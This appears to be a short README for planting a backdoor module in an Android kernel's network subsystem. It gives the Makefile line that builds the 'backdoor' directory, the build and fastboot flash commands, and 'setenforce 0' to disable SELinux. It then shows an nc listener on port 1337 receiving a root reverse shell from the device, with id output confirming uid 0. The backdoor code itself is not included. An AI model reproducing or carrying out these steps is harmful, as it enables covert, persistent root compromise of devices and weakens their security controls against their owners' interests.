# Add to kernel

Modify `net/Makefile`, add line somewhere below `obj-$(CONFIG_NET)`:

```
obj-y  += backdoor/
```
Copy `backdoor` dir under `net/`.

# Build

Run `mka bootimage`.

Flash using `fastboot flash boot boot.img`

# Disable SELinux

Run `setenforce 0`.

Right after that you should receive your shell connection:

```
$ nc -lnvp 1337
Listening on 0.0.0.0 1337
Connection received on 192.168.2.127 44702
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
mydevice / # id
id
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```
